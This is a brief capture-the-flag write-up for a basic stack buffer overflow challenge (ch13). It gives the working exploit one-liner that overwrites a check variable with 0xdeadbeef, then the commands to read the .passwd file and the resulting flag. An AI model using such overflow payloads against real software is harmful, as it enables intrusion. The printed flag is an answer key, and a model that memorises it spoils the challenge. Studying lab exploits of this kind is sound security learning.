# ***STACK BUFFER OVERFLOW BASIC 1***

From the given the challenge we have give the buffer value and the check variable have to changed to ```deadbeef```.

We have to give ``deadbeef`` in reverse order since the stack reads them in the reverse order.

```cat <(python -c "print 'A'*40 + '\xef\xbe\xad\xde'") - | ./ch13``` 

Then do ``ls -al``.
And ``cat .passwd``
We get ``1w4ntm0r3pr0np1s``
